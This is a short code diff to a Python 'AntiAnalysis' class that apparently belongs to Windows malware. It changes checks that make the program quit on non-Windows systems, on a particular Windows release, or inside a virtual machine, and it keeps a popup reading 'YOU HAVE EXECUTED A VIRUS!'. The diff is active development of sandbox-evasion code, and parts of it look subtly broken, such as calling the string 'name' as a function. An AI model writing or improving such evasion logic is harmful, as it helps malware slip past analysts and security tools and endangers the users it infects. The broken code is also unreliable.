@@ -46,11 +46,17 @@ class AntiAnalysis:
         windll.user32.MessageBoxW(0, "YOU HAVE EXECUTED A VIRUS!. PLEASE CLICK NO TO EXIT AND SAFE YOUR SYSTEM", "Info",0x10)
          
     def OperatingSystemCheck(self):
-        if name != "nt": exit(1)
+        #if name != "nt": exit(1)
+        match name():
+            case "posix":
+                exit(1)
 
     def ReleaseCheck(self):
-        if release() != "10": windll.user32.MessageBoxW(0, "This application is only avaliable for windows-10 operating systems.", "Error",0x10), exit(1)
-
+        #if release() != "10": windll.user32.MessageBoxW(0, "This application is only avaliable for windows-10 operating systems.", "Error",0x10), exit(1)
+        match release():
+            case "11":
+                exit(1)
+                
     def VirtualMachineCheck(self):
         if search("IsVirtualMachine                 : True", self.MPPREFERENCE): exit(1)
 
